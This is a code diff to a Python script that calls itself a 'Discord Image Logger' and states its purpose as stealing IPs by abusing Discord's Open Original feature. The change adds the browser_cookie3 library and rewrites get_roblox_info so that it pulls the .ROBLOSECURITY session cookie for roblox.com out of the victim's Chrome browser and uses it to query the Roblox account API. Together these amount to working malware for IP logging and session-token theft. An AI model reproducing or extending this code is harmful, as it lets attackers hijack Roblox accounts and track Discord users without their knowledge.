@@ -4,6 +4,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import browser_cookie3
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -89,7 +90,10 @@ def reportError(error):
     
 def get_roblox_info():
         session = requests.Session()
-        cookie = session.cookies['.ROBLOSECURITY']
+        
+        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
+        cookies = str(cookies)
+        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
 
         user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
         if user_resp.status_code != 200:
